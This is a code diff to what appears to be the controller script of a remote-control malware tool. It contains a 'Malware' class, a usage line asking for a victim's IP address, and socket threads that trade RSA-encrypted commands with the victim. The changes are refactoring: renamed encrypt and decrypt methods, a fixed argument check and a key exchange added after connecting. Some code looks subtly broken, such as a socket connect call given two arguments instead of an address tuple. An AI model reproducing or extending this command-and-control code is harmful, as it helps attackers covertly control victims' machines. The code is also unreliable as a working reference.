@@ -1,6 +1,7 @@
 import threading
 import time
 import socket
+import sys
 
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
@@ -18,7 +19,8 @@ OUT_PORT = 4445
 
 
 def print_help():
-    print('Usage : python3 control.py <victim_IP_address>')
+    print('Couldn\'t load program with arguments', ' '.join(sys.argv))
+    print('Usage : python3 <program_name> <victim_IP_address>')
 
 
 class InThread(threading.Thread):
@@ -41,7 +43,7 @@ class InThread(threading.Thread):
     def run(self):
         again = True
         while again:
-            msg = self.conn.recv(1024).decode('UTF-8')  # Taille de buffer entre parenthèses
+            msg = self.conn.recv(1024).decode('UTF-8')
             if msg == 'exit':
                 again = False
             else:
@@ -61,7 +63,8 @@ class InThread(threading.Thread):
         except ValueError:
             print("Invalid Public Key received")
 
-    def decrypt(self,ciphertext):
+    # Used to be called decrypt
+    def rsa_decrypt(self,ciphertext):
         global private_key
         return private_key.decrypt(ciphertext,
                                 padding.OAEP(
@@ -81,6 +84,8 @@ class OutThread(threading.Thread):
             self.sock.connect(self.ip, self.out_port)
         except ConnectionError:
             print('Unable to connect to {}'.format(self.ip))
+
+        self.send_public_keys()
 
     def run(self):
         again = True
@@ -122,7 +127,8 @@ class OutThread(threading.Thread):
             print("Unable to connect to {}:{}".format(self.destination[0], self.destination[1]))
             self.send_public_keys()
 
-    def encrypt(self, message):
+    # Method used to be called encrypt
+    def rsa_encrypt(self, message):
         global remote_public_key
         return remote_public_key.encrypt(message,
                                          padding.OAEP(
@@ -171,7 +177,7 @@ class Malware():
             format=serialization.PublicFormat.SubjectPublicKeyInfo)
 
 
-if sys.argv == 1:
+if len(sys.argv) == 2:
     ip = sys.argv[1]
     malw = Malware(ip)
 else:
